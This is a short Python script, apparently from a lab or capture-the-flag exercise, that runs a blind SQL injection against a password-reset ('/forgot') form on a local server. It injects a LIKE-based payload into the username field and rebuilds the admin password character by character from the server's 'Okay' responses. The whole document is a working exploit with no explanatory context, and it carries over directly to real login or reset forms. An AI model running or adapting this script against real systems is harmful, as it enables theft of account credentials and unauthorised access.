import requests
import string
password = ""

password_chars = string.ascii_letters + string.digits + '~`!@#$^&*()_+=-:;?/.,<>|\}{[]"'
num_of_placeHolders = 0
while(True):
    #print(password)
    counter = 0
    for char in password_chars:
        input_string = "admin' and password LIKE '" + num_of_placeHolders * "_" + char + "%'; -- "
        data = {'username': input_string}

        response = requests.post('http://127.0.0.1:8008/forgot', data=data)
        if(response.text == "Okay"):
            password = password + char
        else:
            counter = counter + 1
    if(counter == len(password_chars)):
        break
    else:
        num_of_placeHolders = num_of_placeHolders + 1
print(password)